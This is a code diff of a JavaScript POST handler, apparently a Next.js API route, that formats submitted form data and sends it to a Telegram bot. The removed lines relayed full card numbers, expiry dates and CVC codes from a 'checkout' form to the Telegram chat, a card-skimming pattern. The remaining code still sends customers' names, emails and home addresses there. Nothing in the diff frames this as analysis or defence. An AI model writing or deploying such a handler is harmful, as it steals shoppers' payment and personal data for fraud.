@@ -19,7 +19,7 @@ export async function POST(request) {
     }
 
     const message = `
-🚀 *New Checkout Activity*
+🚀 *New Customer Form Submitted*
 ---------------------------
 👤 *Name:* ${data.firstName || 'N/A'} ${data.lastName || 'N/A'}
 📧 *Email:* ${data.email || 'N/A'}
@@ -29,17 +29,9 @@ export async function POST(request) {
 ${data.street || 'N/A'}
 ${data.city || 'N/A'}, ${data.state || 'N/A'} ${data.zip || 'N/A'}
 
-💳 *Payment Method:* ${data.paymentMethod.toUpperCase()}
-${data.paymentMethod === 'card' ? `
-💳 *Card Number:* \`${data.cardNumber || 'N/A'}\`
-🏢 *Card Type:* ${data.cardType || 'N/A'}
-📅 *Expiry:* ${data.expiry || 'N/A'}
-🔒 *CVC:* ${data.cvc || 'N/A'}
-` : `
-🪙 *Status:* User selected Crypto Payment (${data.cryptoUsed || 'N/A'})
-`}
+💳 *Payment Intent:* ${data.paymentMethod ? data.paymentMethod.toUpperCase() : 'N/A'}
 ---------------------------
-📍 *Sync Triggered from Website*
+📍 *Status:* ${data.status || 'Form Data Only'}
     `;
 
     const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
